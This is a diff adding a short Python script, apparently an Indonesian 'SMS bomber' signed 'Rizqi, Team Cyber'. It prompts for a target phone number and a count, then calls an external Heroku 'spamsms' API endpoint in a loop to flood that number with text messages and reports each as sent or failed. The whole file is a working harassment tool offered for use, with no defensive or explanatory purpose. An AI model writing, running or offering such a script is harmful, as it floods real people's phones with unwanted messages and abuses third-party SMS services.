@@ -1,0 +1,24 @@
+import requests, os
+
+def logo():
+  print("""
+
+             -----| Author : Rizqi |-----
+             -----| Script : Spam1 |-----
+             -----| Team   : Cyber |-----
+""")
+def menu():
+     os.system('clear')
+     logo()
+     print("\nMasukan Nomer Di Awali (8xxx)")
+     nomor = input("Nomer Target : ")
+     jum = int(input("Jumlah : "))
+     for i in range(jum):
+         req = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
+         if 'terkirim' in req:
+            print("\nSpam Terkirim")
+         else:
+            print("\nSpam Gagal")
+         os.system('clear')
+
+menu()
